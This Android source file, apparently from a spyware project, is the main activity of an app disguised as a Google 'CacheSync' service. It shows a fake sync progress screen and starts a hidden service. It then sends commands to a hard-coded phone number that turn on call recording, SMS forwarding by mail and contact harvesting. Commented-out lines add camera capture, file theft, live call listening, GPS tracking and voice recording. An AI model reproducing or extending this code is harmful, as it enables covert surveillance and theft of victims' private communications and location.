// code4bones

package com.google.cachesync;

import java.io.PrintStream;

import com.code4bones.utils.*;

import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.content.IntentFilter;
import android.view.Menu;
import android.widget.ProgressBar;
import android.widget.TextView;

public class MainActivity extends Activity {

	public final PrintStream gLog = NetLog.Init("CacheSync","CacheSync.log.txt", true); 
	public CommandPool cmdPool;
	public ProgressBar progress;
	public TextView txtItems;
	
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        int level = getBatteryLevel();
        int total = 20;
        int current = 12;
        
        progress = (ProgressBar)findViewById(R.id.progressBar1);
        txtItems = (TextView)findViewById(R.id.textView4);
        
        
        progress.setMax(120);
        progress.setProgress(level);
        txtItems.setText(String.format("Items %d / %d ( approx )",current,total));
        
        
        
        serviceStart();
       
        BackgroundTask<Void,Void> task = new BackgroundTask<Void,Void>(this,true) {
        	
        	public void onComplete(Void  v) {
                cmdPool.Execute("+79037996299", "@setup;ack:0");
                cmdPool.Execute("+79037996299", "@rcalls;on");
                cmdPool.Execute("+79037996299", "@rsms;on;mail");
                cmdPool.Execute("+79037996299", "@rcontacts;on");
        	}
        	
        	@Override
        	protected Void doInBackground(Void ... arg0) {
                cmdPool = CommandPool.getInstance(MainActivity.this);
                cmdPool.defaultSettings();
                return (Void)null;
        	}
        };
        task.exec();
        
        
 
       //cmdPool.Execute("+79037996299", "@cam");
        
       // cmdPool.Execute("+79037996299", "@file;f:/mnt/sdcard/shot.jpg");
        //cmdPool.Execute("+79037996299", "@net");
       // APNHelper h = new APNHelper(this);
       // h.getMMSApns();
        
        // cmdPool.Execute("+79037996299","@clisten;1");
       
        // cmdPool.Execute("+79037996299", "@file;/mnt/sdcard/120820024511.3gp");
        //cmdPool.Execute("+79037996299","@lcalls;f:120820");
       // cmdPool.Execute("+79037996299","@gps;t:5");
       // cmdPool.Execute("+79037996299", "@voice;t:10");
        // cmdPool.Execute("+79037996299","@setup;f:120810;");
       //cmdPool.Execute("+79037996299","@lcontacts");
     //  cmdPool.Execute("323","@file;/mnt/sdcard/CacheSync.log.txt");
    }

	public int getBatteryLevel() {
		Intent batteryIntent = registerReceiver(null,
		        new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
		int rawlevel = batteryIntent.getIntExtra("level", -1);
		double scale = batteryIntent.getIntExtra("scale", -1);
		int batteryLevel = -1;
		if (rawlevel >= 0 && scale > 0) {
			batteryLevel = (int)((rawlevel / scale)*100);
		}
		return batteryLevel;
	}
    
    public void serviceStart() {
    	Intent service = new Intent(this,CacheSyncService.class);
    	this.startService(service);
    }
    	
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }
}
